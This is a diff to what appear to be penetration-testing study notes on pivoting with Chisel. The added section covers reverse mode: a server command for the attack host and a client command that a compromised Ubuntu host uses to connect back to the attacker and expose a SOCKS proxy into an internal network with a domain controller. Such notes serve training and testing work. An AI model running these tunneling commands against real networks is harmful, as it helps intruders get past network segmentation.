@@ -2,6 +2,7 @@
 - [Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment.
 - In a scenario attackers might have to tunnel traffic to a webserver on the `172.16.5.0`/`23` network (internal network). The Domain Controller with the address `172.16.5.19`. 
 - This is not directly accessible to the attack host since attack host and the domain controller belong to different network segments. However, since an Ubuntu server has already been compromisded, it allows to start a Chisel server on it that will listen on a specific port and forward traffic to the internal network through the established tunnel.
+- When the Chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying `R:socks` will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.
 ---
 ```
 git clone https://github.com/jpillora/chisel.git
@@ -45,3 +46,14 @@ start a client from the attack host and connect to the target server.
 socks5 127.0.0.1 1080
 ```
 modify our proxychains.conf file located at `/etc/proxychains.conf` and add `1080` port at the end
+
+## chisel reverse pivot
+```
+sudo ./chisel server --reverse -v -p 1234 --socks5
+```
+	We'll start the server in our attack host with the option `--reverse`.
+	```
+./chisel client -v 10.10.14.17:1234 R:socks
+```
+connect from the Ubuntu (pivot host) to our attack host, using the option `R:socks`
+
